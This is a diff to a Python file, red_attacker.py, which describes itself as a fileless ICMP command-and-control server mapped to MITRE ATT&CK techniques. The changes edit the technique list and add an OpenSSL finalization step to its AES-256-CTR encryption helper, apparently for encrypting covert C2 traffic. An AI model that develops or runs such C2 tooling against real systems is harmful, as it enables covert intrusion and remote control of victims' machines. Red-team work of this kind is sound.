@@ -2,7 +2,7 @@
 """
 red_attacker.py - Fileless ICMP C2 Server
 ================================================================================
-MITRE ATT&CK : T1059.006  T1027  T1095  T1071.001  T1620
+MITRE ATT&CK : T1059.006  T1027  T1095  T1620
 Kill Chain    : Phase 2 Weaponization → Phase 4 Exploitation → Phase 6 C2
 
 PRINCIPLE 1 — Fileless Execution via memfd_create
@@ -306,6 +306,9 @@ _libcrypto.EVP_EncryptUpdate.restype = ctypes.c_int
 _libcrypto.EVP_EncryptUpdate.argtypes = [
     ctypes.c_void_p, ctypes.c_char_p,
     ctypes.POINTER(ctypes.c_int), ctypes.c_char_p, ctypes.c_int]
+_libcrypto.EVP_EncryptFinal_ex.restype = ctypes.c_int
+_libcrypto.EVP_EncryptFinal_ex.argtypes = [
+    ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int)]
 _libcrypto.EVP_CIPHER_CTX_free.restype = None
 _libcrypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
 
@@ -314,7 +317,8 @@ AES_KEY = hashlib.sha256(SHARED_SECRET).digest()  # 32 bytes for AES-256
 
 def aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
     """AES-256-CTR encrypt/decrypt via OpenSSL libcrypto.
-    CTR mode is symmetric — same function encrypts and decrypts."""
+    CTR mode is symmetric — same function encrypts and decrypts.
+    Follows OpenSSL best practice: Init → Update → Final."""
     ctx = _libcrypto.EVP_CIPHER_CTX_new()
     _libcrypto.EVP_EncryptInit_ex(
         ctx, _libcrypto.EVP_aes_256_ctr(), None, key, iv)
@@ -322,7 +326,12 @@ def aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
     out_len = ctypes.c_int(0)
     _libcrypto.EVP_EncryptUpdate(
         ctx, out, ctypes.byref(out_len), data, len(data))
-    result = out.raw[:out_len.value]
+    # Final step (CTR mode outputs 0 bytes here, but required by OpenSSL API)
+    final_len = ctypes.c_int(0)
+    _libcrypto.EVP_EncryptFinal_ex(
+        ctx, ctypes.cast(ctypes.byref(out, out_len.value), ctypes.c_char_p),
+        ctypes.byref(final_len))
+    result = out.raw[:out_len.value + final_len.value]
     _libcrypto.EVP_CIPHER_CTX_free(ctx)
     return result
 
